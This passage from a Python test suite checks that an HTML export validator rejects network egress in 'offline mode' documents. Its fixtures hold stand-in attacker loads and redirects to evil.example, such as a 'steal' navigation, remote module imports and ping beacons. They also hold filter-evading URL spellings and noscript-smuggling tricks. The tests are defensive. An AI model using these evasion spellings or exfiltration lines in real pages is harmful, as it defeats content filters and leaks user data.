                       '<div referrerpolicy="unsafe-url">x</div>',
                       '<svg><image href="local.png" referrerpolicy="unsafe-url"/></svg>',
                       '<svg><use href="local.svg#i" referrerpolicy="unsafe-url"/></svg>',
                       '<svg><filter><feImage href="local.png" referrerpolicy="unsafe-url"/></filter></svg>',
                       '<svg><a href="local.html" referrerpolicy="no-referrer"/></svg>',
                       '<a href="local.html">x</a>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], errors)
                self.assertEqual(warnings, [], warnings)

    def test_offline_mode_rejects_a_permissive_referrer_meta(self):
        # The document-level half of the same surface. The export replaces an authored referrer
        # meta with `no-referrer` rather than merging it, because the LAST referrer meta a document
        # declares wins. Every permissive one is reported rather than only the effective one: the
        # flat tag index cannot tell a live meta from a `<template>`-parked one, so letting a later
        # `no-referrer` suppress an earlier permissive meta could be masked by an inert meta, and
        # the export removes every one of them anyway.
        for markup in ('<meta name="referrer" content="unsafe-url">',
                       '<meta name="referrer" content="always">',
                       '<meta name="referrer" content="origin-when-crossorigin">',
                       '<meta name="Referrer" content="Strict-Origin-When-Cross-Origin">',
                       '<meta name="referrer" content="unsafe-url"><meta name="referrer" content="no-referrer">',
                       '<template><meta name="referrer" content="unsafe-url"></template>',
                       '<noscript><meta name="referrer" content="unsafe-url"></noscript>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "referrer" in e for e in errors),
                                "expected an offline referrer-meta error for %r, got %r"
                                % (markup, errors))

    def test_offline_mode_accepts_a_referrer_meta_a_browser_does_not_honour(self):
        # The export's own output must validate: it writes exactly one `no-referrer` meta, and a
        # document that declares none at all is what every other offline test here carries. The
        # rest are values a real Chromium was MEASURED setting no policy from - a referrer meta is
        # not the HTTP header, so its content is neither split on commas nor trimmed, and an
        # unknown value simply sets nothing (each of these documents fell back to the browser
        # default cross-origin rather than to the token in the value). The `referrer-policy`
        # pragma is here for the same reason: it is not an HTML pragma directive and the same
        # measurement showed Chromium ignoring it entirely, so it can weaken nothing.
        for markup in ('<meta name="referrer" content="no-referrer">',
                       '<meta name="referrer" content="never">',
                       '<meta name="referrer" content="no-referrer, unsafe-url">',
                       '<meta name="referrer" content="unsafe-url, no-referrer">',
                       '<meta name="referrer" content=" unsafe-url ">',
                       '<meta name="referrer" content=" origin-when-crossorigin ">',
                       '<meta name="referrer" content="">',
                       '<meta name="referrer" content="not-a-policy">',
                       '<meta http-equiv="referrer-policy" content="unsafe-url">'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], errors)
                self.assertEqual(warnings, [], warnings)

    def test_the_referrer_surface_is_left_alone_outside_offline_mode(self):
        # Scoped to the mode whose contract it belongs to, like every other rule here: a shareable
        # export runs no offline strip and makes no zero-network promise.
        for markup in ('<a href="local.html" referrerpolicy="unsafe-url">x</a>',
                       '<meta name="referrer" content="unsafe-url">'):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertFalse(any("referrer" in e for e in errors), errors)

    def test_the_referrer_policy_readings_match_what_a_browser_honours(self):
        # The two readings are deliberately DIFFERENT grammars, so pin each directly rather than
        # only through the gate. Every expectation here was measured in a real Chromium: the
        # attribute is an enumerated one (exact token, ASCII case-insensitive, no trim, no legacy
        # alias), while a referrer meta folds HTML's legacy aliases but is neither split on commas
        # nor trimmed. Sharing one parser between them - which an earlier revision of this rule did
        # - reported two documents a browser treats as carrying no policy at all.
        for value, expected in (("unsafe-url", "unsafe-url"), ("UNSAFE-URL", "unsafe-url"),
                                ("no-referrer", "no-referrer"), (" unsafe-url ", ""),
                                ("always", ""), ("never", ""), ("", ""), (None, ""),
                                ("no-referrer, unsafe-url", ""), ("bogus", "")):
            with self.subTest(attr=value):
                self.assertEqual(resources.referrer_policy_attr(value), expected)
        for value, expected in (("unsafe-url", "unsafe-url"), ("UNSAFE-URL", "unsafe-url"),
                                ("no-referrer", "no-referrer"), ("always", "unsafe-url"),
                                ("never", "no-referrer"), ("default", "no-referrer-when-downgrade"),
                                ("origin-when-crossorigin", "origin-when-cross-origin"),
                                ("ORIGIN-WHEN-CROSSORIGIN", "origin-when-cross-origin"),
                                (" unsafe-url ", ""), ("no-referrer, unsafe-url", ""),
                                ("unsafe-url, no-referrer", ""), ("unsafe-url, never", ""),
                                ("", ""), (None, ""), ("bogus", "")):
            with self.subTest(meta=value):
                self.assertEqual(resources.referrer_meta_policy(value), expected)

    def test_offline_mode_rejects_network_resources_inside_noscript(self):
        # A <noscript> body is raw TEXT only while scripting is enabled; with scripting off a
        # browser parses it and really does load what it names. The EGRESS checks must
        # therefore fail CLOSED on the fallback markup - the redirect and the image below are
        # live for exactly the reader who cannot run the layer at all.
        fallback = ('<noscript><meta http-equiv="refresh" content="0;url=//evil.example/out">'
                    '<img src="//evil.example/x.png" alt="x"></noscript>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors), errors)
        self.assertTrue(any("evil.example/x.png" in e for e in errors), errors)

    def test_a_csp_meta_inside_noscript_does_not_satisfy_the_offline_policy(self):
        # The mirror image: a PRESENCE check must read the browser's view, not the fallback
        # superset. A scripting-enabled browser never creates this element, so it cannot be the
        # document's policy - reading it would suppress the missing-CSP error outright.
        doc = with_offline_mode(build(body=self._body(MAIN)), csp=False)
        doc = doc.replace("<head>\n",
                          '<head>\n<noscript><meta http-equiv="Content-Security-Policy" '
                          'content="%s"></noscript>\n' % OFFLINE_CSP, 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)

    def test_an_unclosed_noscript_still_contributes_its_fallback_markup(self):
        # A browser runs an unclosed raw-text element to end of document, so the fallback markup
        # after it is still live for a scripting-disabled reader.
        fallback = '<noscript><img src="//evil.example/x.png" alt="x">'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("evil.example/x.png" in e for e in errors), errors)

    def test_offline_mode_rejects_css_egress_inside_a_noscript_fallback(self):
        # The ELEMENT lookups already ask the egress question, but the CSS scans read the
        # scripting-ENABLED document view, which sees a `<noscript>` body as raw TEXT. A browser
        # with scripting OFF parses that body and really does fetch what its CSS names, so the
        # stylesheet `@import`, the `url(...)` in a `<style>` body and the one in a `style=`
        # attribute below are all live for exactly the reader who cannot run the layer.
        cases = [
            ('<noscript><style>@import url(https://evil.example/x.css);</style></noscript>',
             "@import"),
            ('<noscript><style>body { background: url(//evil.example/x.png); }</style></noscript>',
             "style block contains a network url"),
            ('<noscript><div style="background:url(//evil.example/x.png)">f</div></noscript>',
             "inline style on <div> contains a network url"),
        ]
        for fallback, needle in cases:
            with self.subTest(fallback=fallback):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, fallback))))
                self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                                "expected %r for %r: %r" % (needle, fallback, errors))

    def test_offline_mode_accepts_an_ordinary_noscript_fallback(self):
        # The egress widening must not turn a legitimate fallback - one whose CSS references
        # nothing over the network - into an error.
        fallback = ('<noscript><style>.cmh-fallback { color: #123456; '
                    'background: url(data:image/png;base64,AAAA); }</style>'
                    '<p class="cmh-fallback" style="color:#123456">enable scripting</p></noscript>')
        errors, warnings = self._errs_warns(
            with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_reports_a_noscript_closer_smuggled_into_fallback_css(self):
        # The scripting-ENABLED tokenizer ends the `<noscript>` body at the first `</noscript`,
        # but inside the fallback's `<style>` body a scripting-DISABLED browser is still in raw
        # text, so the stylesheet runs on past that closer and really does fetch. Neither view
        # holds the CSS after the seam, so the document must be REPORTED as unreadable rather
        # than certified offline-clean.
        fallback = ('<noscript><style>/* </noscript> */ '
                    "body { background: url(//evil.example/x.png); }</style></noscript>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("could not parse the document" in e for e in errors), errors)

    def test_the_fallback_css_view_matches_what_the_document_view_already_does(self):
        # The fallback view is the SAME rule applied to a second source of truth, so a shape must
        # be judged the same wherever it sits. Both of these are deliberate and pre-date this
        # view: `<template>`-parked CSS is checked because the offline export walks into templates
        # (so a file keeping it is a file an export would change), and a `<style>` is checked
        # whatever its `type` for the same parity reason. Pinning the pair together is what stops
        # the two views from drifting into different policies.
        for parked in ("<template><style>@import url(//evil.example/x.css);</style></template>",
                       '<style type="text/plain">@import url(//evil.example/x.css);</style>'):
            with self.subTest(parked=parked):
                in_doc, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, parked))))
                in_fallback, _ = self._errs_warns(with_offline_mode(
                    build(body=self._body(MAIN, "<noscript>%s</noscript>" % parked))))
                self.assertTrue(in_doc, "expected the document view to report %r" % parked)
                self.assertEqual(in_fallback, in_doc)

    def test_a_document_whose_tag_index_fails_is_reported_not_passed(self):
        # "Could not look" must not read like "nothing more to find": the self-contained
        # guarantee is derived from the tag index, so a failed index is its own error.
        from checks import parsing as _parsing
        doc = build(body=self._body(MAIN))
        _parsing._tag_attr_index.cache_clear()
        self.addCleanup(_parsing._tag_attr_index.cache_clear)
        with mock.patch.object(_parsing, "_TagAttrParser", side_effect=RuntimeError("boom")):
            errors, _ = self._errs_warns(doc)
        self.assertTrue(any("could not parse the document for the self-contained" in e
                            for e in errors), errors)

    def test_validate_releases_the_shared_tag_index(self):
        from checks import parsing as _parsing
        self._errs_warns(build(body=self._body(MAIN)))
        self.assertEqual(_parsing._tag_attr_index.cache_info().currsize, 0)

    def test_offline_mode_rejects_network_css_urls(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            ":root { --cp-bg: #ffffff; --cp-text: #000000; background-image: url(https://example.com/bg.png); }")
        main = MAIN.replace("<p>content</p>", '<p style="background: url(//example.com/inline.png)">content</p>')
        errors, _ = self._errs_warns(with_offline_mode(build(css=css, body=self._body(main))))
        for needle in ("style block", "inline style"):
            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
                            "expected offline CSS url error for %s, got %r" % (needle, errors))

    def test_offline_mode_rejects_a_scheme_only_css_url_and_import(self):
        # `url(https:evil.example/x.png)` carries NO slashes after the scheme, and the URL parser's
        # special-authority states ignore whatever run of slashes follows a special scheme's colon,
        # so a browser resolves it to the same host as `url(https://evil.example/x.png)` and really
        # does fetch it from a `file://` document. While the gates required the two slashes the
        # whole CSS channel was open to a one-token spelling change and `--strict` certified such a
        # file as offline-clean. The exporter's own CSS strips move with them (issue #961), so the
        # gate never rejects what the strip leaves behind.
        cases = [
            ("<style>body { background: url(https:evil.example/x.png); }</style>",
             "style block contains a network url"),
            ("<style>body { background: url(https:/evil.example/x.png); }</style>",
             "style block contains a network url"),
            ('<style>@import "https:evil.example/t.css";</style>', "@import"),
            ("<style>@import url(HTTP:/evil.example/t.css);</style>", "@import"),
            ('<div style="background:url(https:evil.example/inline.png)">f</div>',
             "inline style on <div> contains a network url"),
        ]
        for markup, needle in cases:
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                                "expected %r for %r: %r" % (needle, markup, errors))

    def test_offline_mode_still_accepts_the_css_the_scheme_only_widening_must_not_reach(self):
        # The widening must not turn a local stylesheet into an error. A relative or `data:`
        # reference is the whole control case, and an authority terminated at once by the end of
        # the value is an EMPTY host a special scheme cannot even parse - `url(https://)` and
        # `url(//)` fetch nothing at all, and the exporter's strips leave both alone, so reporting
        # either would reject a file with no egress.
        markup = ("<style>@import url(theme.css); @import './local.css'; "
                  ".a { background: url(x.png); } .b { background: url('./img/y.png'); } "
                  ".c { background: url(data:image/png;base64,AAAA); } "
                  ".d { background: url(https://); } .e { background: url(//); }</style>"
                  '<div style="background:url(x.png)">f</div>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertEqual([e for e in errors if "url(" in e or "@import" in e], [], errors)

    def test_offline_mode_rejects_a_scheme_only_attribute_reference(self):
        # The attribute predicate moved with the CSS gates (issue #961), so the same slash-less
        # spelling is caught in a reference a browser LOADS. The empty-authority control stays
        # local: a special scheme with no host is a parse failure that fetches nothing, and the
        # export leaves it alone, so reporting it would reject a file with no egress.
        for markup, expected in (('<img src="https:evil.example/x.png" alt="x">', True),
                                 ('<img src="https:/evil.example/y.png" alt="y">', True),
                                 ('<img src="https://" alt="empty">', False)):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                hit = any("loads over the network" in e or "evil.example" in e for e in errors)
                self.assertEqual(hit, expected, (markup, errors))

    def test_offline_mode_allows_non_fetching_network_links(self):
        links = (
            '<link rel="canonical" href="https://example.com/report">\n'
            '<link rel="alternate" href="https://example.com/report.atom" type="application/atom+xml">\n'
            '<link rel="author" href="https://example.com/about">'
        )
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, links))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # An offline export used to skip four reserved layer ids BEFORE testing whether the script
    # was runnable, so a decoy that merely borrowed one bypassed both of its strips (#822). The
    # validator never had that skip, which is the asymmetry that let the exporter preserve a
    # script its own --strict gate then rejected. Pin the validator side in both directions so a
    # future "make them agree" change cannot resolve the disagreement by adding the skip here.
    def test_offline_egress_check_exempts_no_reserved_layer_id(self):
        reserved = ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "cmhVendoredRichLibs", "reviewedSections")
        for rid in reserved:
            with self.subTest(reserved_id=rid):
                decoy = ('<script type="text/javascript" id="%s">\n'
                         'import("https://evil.example/x.js");\n'
                         '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, decoy))))
                self.assertTrue(any("imports a network module" in e for e in errors), (rid, errors))
                nav = ('<script type="text/javascript" id="%s">\n'
                       'window.location.href = "https://evil.example/steal";\n'
                       '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nav))))
                self.assertTrue(any("direct top-level " in e for e in errors), (rid, errors))

    # A genuinely inert data block carrying the same text is DATA, not code: the exporter now
    # repairs a runnable-typed reserved block into one of these rather than deleting it, so the
    # validator must keep accepting the repaired shape.
    def test_offline_egress_check_ignores_an_inert_reserved_block_quoting_egress(self):
        quote = ('<script type="application/json" id="reviewedSections">\n'
                 '{"x": "import(\\"https://evil.example/x.js\\") and location.href = '
                 '\\"https://evil.example/steal\\""}\n'
                 '</script>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, quote))))
        self.assertFalse(any("imports a network module" in e or "direct top-level " in e for e in errors), errors)

    # An SVG <script> loads through `href` (SVG2) or the legacy `xlink:href`, never `src`, so the
    # resource check missed it entirely and blessed such a file as offline-clean (#881). The
    # exporter strips the same shape, so the gate has to see it too or the two disagree. The
    # padded value is browser-real: a URL parser strips leading whitespace before it parses, so
    # ` https://...` loads - and the exporter's own predicate trims, so a validator that did not
    # would bless a file the strip had cleaned.
    def test_offline_mode_rejects_an_svg_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            for url in ("https://evil.example/x.js", "//evil.example/x.js",
                        " \t https://evil.example/x.js"):
                with self.subTest(attr=attr, url=url):
                    svg = '<svg><script %s="%s"></script></svg>' % (attr, url)
                    errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                    self.assertTrue(any("offline mode" in e and "<script %s" % attr in e for e in errors),
                                    (attr, url, errors))

    # Borrowing a reserved layer id buys no exemption from the LOAD check either: the exporter
    # neutralizes such a block into inert data, but a remote load is what the strip removes outright,
    # so the gate must flag it rather than read the id and look away.
    def test_offline_mode_rejects_a_reserved_id_svg_script_that_loads_through_href(self):
        for rid in ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "reviewedSections", "cmhVendoredRichLibs"):
            with self.subTest(reserved_id=rid):
                svg = ('<svg><script id="%s" href="https://evil.example/x.js"></script></svg>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (rid, errors))

    def test_offline_mode_accepts_a_relative_or_data_svg_script_reference(self):
        svg = ('<svg><script href="svg-local-keep.js"></script>'
               '<script xlink:href="data:text/javascript,void%200"></script></svg>')
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # An SVG `feImage` fetches exactly like an SVG `<image>` or `<use>` - both of which the offline
    # media list already covers - but the filter primitive was in neither the list nor the export
    # strip, so a document carrying one rode into a zero-network export and `--strict` certified it
    # clean (#992). `HTMLParser` lowercases the tag, so the gate looks it up as `feimage`.
    def test_offline_mode_rejects_an_feimage_that_loads_over_the_network(self):
        for attr in ("href", "xlink:href"):
            for url in ("https://evil.example/x.png", "//evil.example/x.png",
                        " \t https://evil.example/x.png"):
                with self.subTest(attr=attr, url=url):
                    svg = '<svg><filter id="f"><feImage %s="%s"/></filter></svg>' % (attr, url)
                    errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                    self.assertTrue(any("offline mode" in e and "<feimage %s" % attr in e
                                        for e in errors), (attr, url, errors))

    # The control: a relative or `data:` primitive resolves inside the file and is left alone, so
    # widening the media list cannot start rejecting a document with no egress at all.
    def test_offline_mode_accepts_a_relative_or_data_feimage_reference(self):
        svg = ('<svg><filter id="f1"><feImage href="local-tile.png"/></filter>'
               '<filter id="f2"><feImage xlink:href="data:image/gif;base64,R0lGODlhAQABAAAAACw="/>'
               "</filter></svg>")
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # Hyperlink auditing: a click POSTs to every URL in `ping`, and neither the export strip nor
    # this gate looked at the attribute (#992). CSP Level 3 folds auditing into `connect-src`,
    # which the offline policy does set to `'none'`, so a current browser most likely absorbs it -
    # but the strip and the gate are the layer that must not DEPEND on the CSP, and the `ping-src`
    # history makes that coverage version-dependent. EVERY ping goes, network target or not: the
    # exporter removes the attribute whatever it names (the meta-refresh precedent), so a gate that
    # accepted a relative one would bless a file an export would change.
    def test_offline_mode_rejects_hyperlink_auditing(self):
        for tag, markup in (
                ("a", '<a href="#s" ping="https://evil.example/audit">x</a>'),
                ("a", '<a href="#s" ping="local-audit">x</a>'),
                ("area", '<map name="m"><area shape="rect" coords="0,0,1,1" href="#s" '
                         'ping="https://evil.example/audit"></map>')):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<%s ping" % tag in e for e in errors),
                                (markup, errors))
        network, _ = self._errs_warns(with_offline_mode(build(body=self._body(
            MAIN, '<a href="#s" ping="https://evil.example/audit">x</a>'))))
        self.assertTrue(any("evil.example" in e for e in network), network)

    # An empty `ping` names no URL, so a browser sends nothing and the strip has nothing to take
    # away; an ordinary link with no auditing at all is the other control.
    def test_offline_mode_accepts_a_link_without_hyperlink_auditing(self):
        markup = '<a href="#s" ping="">x</a> <a href="#s">y</a>'
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # The boundary that decides whether a ping names anything is HTML's own tokenization - ASCII
    # whitespace ONLY - not either engine's whitespace class. `str.strip()` here and `String.trim()`
    # in the exporter disagree about NBSP, U+FEFF and U+001C-U+001F, so a trimming gate would drift
    # from the strip in BOTH directions: it would call an NBSP ping empty and bless it, though a
    # browser resolves it as a relative target and POSTs to `/%C2%A0`, and it would leave a
    # U+001C-only value that the exporter's own trim called empty. Only a value made of ASCII
    # whitespace (or nothing at all) is a no-op on both sides.
    def test_offline_mode_reads_a_ping_list_the_way_html_tokenizes_it(self):
        for value, rejected in (("\u00a0", True), ("\ufeff", True), ("\u001c", True),
                                ("\u000b", True), (" \t\n\f\r ", False), ("", False)):
            with self.subTest(value=repr(value)):
                markup = '<a href="#s" ping="%s">x</a>' % value
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                hit = any("offline mode" in e and "<a ping" in e for e in errors)
                self.assertEqual(hit, rejected, (repr(value), errors))

    # A browser normalizes several spellings INTO a network URL before it fetches (issue #923), so
    # the gate must read the value the way the URL parser does. Both implementations used to test
    # the raw literal and call every one of these local, which is under-detection rather than a
    # disagreement: the exporter left the load in place and the gate then certified the file.
    def test_offline_mode_rejects_a_browser_normalized_network_reference(self):
        for url in ("https:/\\evil.example/x.js", "\\\\evil.example/x.js",
                    "ht\ttps://evil.example/x.js", "https:\n//evil.example/x.js",
                    "file://evil.example/x.js", "file:\\\\evil.example/x.js",
                    "file:////evil.example/x.js"):
            with self.subTest(url=url):
                markup = ('<img src="%s"><svg><script href="%s"></script></svg>' % (url, url))
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<img src" in e for e in errors),
                                (url, errors))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (url, errors))

    # ...and the spellings that stay ON the machine must still pass, or the gate would reject an
    # offline file with no egress at all: a `file:` URL with an empty host, `localhost` - including
    # every spelling the URL parser CANONICALIZES onto it, since it percent-decodes and lowercases a
    # file host before the file-host state empties it - or a Windows DRIVE LETTER in the host
    # position (which the URL parser turns into a path), and a backslash inside an ordinary relative
    # path.
    def test_offline_mode_accepts_a_local_file_or_backslash_relative_reference(self):
        for url in ("file:///C:/local/x.js", "file:///local/x.js", "file://localhost/local/x.js",
                    "file://C:/local/x.js", "file://c|/local/x.js", "file:////C:/local/x.js",
                    "file://local%68ost/local/x.js", "file://%4Cocalhost/local/x.js",
                    "file:////local%68ost/local/x.js",
                    "sub\\local-keep.js", "/root\\local-keep.js"):
            with self.subTest(url=url):
                markup = '<svg><script href="%s"></script></svg>' % url
                errors, warnings = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertEqual(errors, [], (url, errors))
                self.assertEqual(warnings, [], (url, warnings))

    # A TRAILING DOT is not that: the file-host state special-cases the exact string `localhost`, so
    # `file://localhost./x` keeps a NON-EMPTY host and resolves to the SMB path `\\localhost.\x` on
    # Windows - egress even though it lands on the loopback, exactly as `\\localhost\C$\x` is. The
    # percent-encoded spellings of the dot and of the host agree, and a host that merely STARTS with
    # `localhost` is a different machine. A SECOND path slash is egress for a different reason: the
    # host is emptied and `//evil.example/x.js` stays as the PATH, so the value canonicalizes to
    # `file:////evil.example/x.js` - the four-separator UNC form the rows above already reject. The
    # backslash spelling reaches the same place, since the URL cleanup maps `\` onto `/`.
    def test_offline_mode_rejects_a_trailing_dot_or_near_miss_localhost_file_authority(self):
        for url in ("file://localhost./x.js", "file://localhost%2E/x.js",
                    "file://%6Cocalhost./x.js", "file://local%68ostx/x.js",
                    "file://localhost//evil.example/x.js",
                    "file://local%68ost//evil.example/x.js",
                    "file://localhost/\\evil.example/x.js"):
            with self.subTest(url=url):
                markup = '<svg><script href="%s"></script></svg>' % url
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (url, errors))

    # A `srcset` candidate is tokenized before the URL predicate sees it, and HTML draws that
    # boundary at ASCII whitespace only. Splitting on the ENGINE's whitespace cut the candidate at a
    # U+000B and hid a real load from both implementations.
    def test_offline_mode_reads_a_srcset_candidate_the_way_html_tokenizes_it(self):
        markup = '<img src="local.png" srcset="\u0001\u000b//evil.example/x.png 1x">'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertTrue(any("offline mode" in e and "<img srcset" in e for e in errors), errors)

    # The self-contained guarantee is not offline-only: a shareable document that loads a script
    # over the network is an error however the load is spelled.
    def test_shareable_mode_rejects_a_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/x.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # The Chart.js CDN opt-in is bound to `src`, because `check_charts` only validates a `src`
    # loader's pinned version and SRI. Exempting an `href` would wave through a remote script with
    # a chart-shaped filename that nothing else in the validator ever looks at.
    def test_the_chartjs_cdn_exemption_does_not_extend_to_a_script_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/z/chart.min.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # A `speculationrules` or `importmap` block is ACTIVE but is not JavaScript, so the
    # executable-type predicate never looked at it: a speculation ruleset makes the browser
    # prefetch/prerender (a `"source": "document"` one needs no URL literal at all), and an import
    # map re-points where a bare module specifier resolves - which the literal
    # `import "https://..."` scan cannot see. The exporter removes every ruleset and every import
    # map that is not entirely relative, so the gate must reject a hand-authored offline file that
    # keeps one, in every spelling JSON allows.
    def test_offline_mode_rejects_active_data_blocks(self):
        cases = (
            ("speculationrules", "", '{"prerender": [{"urls": ["https://evil.example/beacon"]}]}'),
            # No URL literal anywhere: the ruleset prefetches the document's own links.
            ("speculationrules", "", '{"prefetch": [{"source": "document"}]}'),
            # Even a purely relative ruleset goes: it exists only to fetch.
            ("speculationrules", "", '{"prerender": [{"urls": ["next.html"]}]}'),
            # An external ruleset or map is unreviewable and cannot be self-contained.
            ("speculationrules", ' src="rules.json"', ""),
            ("importmap", ' src="map.json"', '{"imports": {"lib": "./lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "https://evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "//evil.example/lib.js"}}'),
            # A backslash opens an authority for a special scheme exactly as a slash does.
            ("importmap", "", '{"imports": {"lib": "/\\\\evil.example/lib.js"}}'),
            # JSON permits an escaped solidus and a \\uXXXX escape for any character, and the URL
            # parser strips padding and an embedded tab - a text scan closes one of these.
            ("importmap", "", '{"imports": {"lib": "https:\\/\\/evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "https:\\u002f\\u002fevil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "  https://evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "htt\\tps://evil.example/lib.js"}}'),
            # A data:/blob: target maps a bare specifier onto code the document never carried.
            ("importmap", "", '{"imports": {"lib": "data:text/javascript,export default 1"}}'),
            ("importmap", "", '{"imports": {"lib": "blob:https://evil.example/x"}}'),
            # A scopes KEY is a reference too.
            ("importmap", "", '{"scopes": {"https://cdn.example/": {"lib": "./lib.js"}}}'),
            # A browser hard-fails an unparseable map, so failing closed loses nothing.
            ("importmap", "", "not json at all"),
        )
        for stype, attr, body in cases:
            with self.subTest(type=stype, attr=attr, body=body):
                block = '<script type="%s"%s>%s</script>' % (stype, attr, body)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("offline mode" in e and stype in e for e in errors),
                                (stype, attr, body, errors))

    # The controls: an entirely relative import map is legitimate content and must survive, and a
    # MIME-parameter type is NOT one of these keyword types, so it is inert data a browser ignores
    # and the gate must leave alone (deleting an author's inert block is the costlier error).
    def test_offline_mode_accepts_local_and_parameterized_active_data_blocks(self):
        blocks = (
            '<script type="importmap">{"imports": {"lib": "./lib.js", "app": "/app.js"}}</script>',
            '<script type="importmap">{"scopes": {"/inner/": {"lib": "./inner.js"}}}</script>',
            '<script type="importmap;charset=utf-8">'
            '{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
            '<script type="text/plain">{"prerender": [{"urls": ["https://evil.example/x"]}]}</script>',
        )
        errors, warnings = self._errs_warns(
            with_offline_mode(build(body=self._body(MAIN, "\n".join(blocks)))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # `<template>` content is preserved verbatim by serialization and a second script can adopt
    # and insert it, so the exporter's inline-egress scan now descends into it. The validator's
    # parser deliberately drops template content, so it could not see such a script at all - which
    # is exactly the disagreement that would let --strict bless a file the exporter strips.
    def test_offline_egress_check_sees_a_template_parked_script(self):
        cases = (
            ('<script type="text/javascript">import("https://evil.example/x.js");</script>',
             "imports a network module"),
            ('<script type="text/javascript">window.location.href = "https://evil.example/steal";</script>',
             "direct top-level "),
            ('<script type="importmap">{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
             "importmap"),
            ('<script type="speculationrules">{"prefetch": [{"source": "document"}]}</script>',
             "speculationrules"),
        )
        for inner, needle in cases:
            with self.subTest(inner=inner):
                block = "<template id=\"parked\">\n%s\n</template>" % inner
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any(needle in e for e in errors), (inner, errors))
                # ...and the same block nested a second template deep, which is what the exporter's
                # recursive walk exists for.
                nested = "<template id=\"outer\"><template id=\"inner\">\n%s\n</template></template>" % inner
